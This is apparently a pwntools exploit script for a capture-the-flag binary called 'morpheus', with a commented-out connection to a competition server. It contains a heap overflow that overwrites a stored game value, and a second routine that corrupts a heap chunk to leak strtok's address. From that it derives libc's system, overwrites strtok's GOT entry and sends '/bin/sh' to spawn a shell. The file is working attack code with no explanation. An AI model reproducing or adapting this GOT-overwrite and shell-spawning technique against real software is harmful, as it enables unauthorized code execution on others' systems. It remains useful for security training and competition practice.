from pwn import *
r = process("./morpheus")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def arbitrary_memory_write(): # changing value of the hp and attack to win this game

    #r = remote("soal.jawara.idsirtii.or.id",51337)
    p = ""
    p += p64(0) * 5
    p += p64(0x90)
    p += p64(0x00)
    p += p32(2000000000)
    p += p32(2000000000)
    #gdb.attach(r)
    r.sendline("1")
    r.sendline("2")
    r.sendline(p)
    r.sendline("4")
    r.interactive()

def un64(data):
    return int(data[::-1].encode("hex"),16)

def main():
    log.info("preparing")
    heapOverflow_2_GOT_overwrite()

def heapOverflow_2_GOT_overwrite():
    strtok_got = 0x000000602078
    offset = 40
    info_chunk = 0x0000000000000021

    p = "A" * offset
    p += p64(info_chunk)
    p += p64(strtok_got)
    p += p64(0x00)

    r.sendlineafter("Choice: ","1")
    r.sendlineafter("Select ID: ","2")
    r.sendlineafter("Insert Name: ",p)


    #--------------------------------------
    r.recvuntil("| ID   : 3")
    r.recvuntil("| Name : ")
    leak = un64(r.recv(8).replace("|","").replace("\n",""))
    log.info("leak : " + hex(leak))

    libc_base = leak - libc.symbols['strtok']
    libc_system = libc_base + libc.symbols['system']

    log.info("system : " + str(libc_system))

    r.sendlineafter("Choice: ","1")
    r.sendlineafter("Select ID: ","3")
    r.sendlineafter("Insert Name: ",p64(libc_system))

    r.sendlineafter("Choice: ","1")
    r.sendlineafter("Select ID: ","2")
    r.sendlineafter("Insert Name: ","/bin/sh")
    r.interactive()


if __name__ == "__main__":
    main()
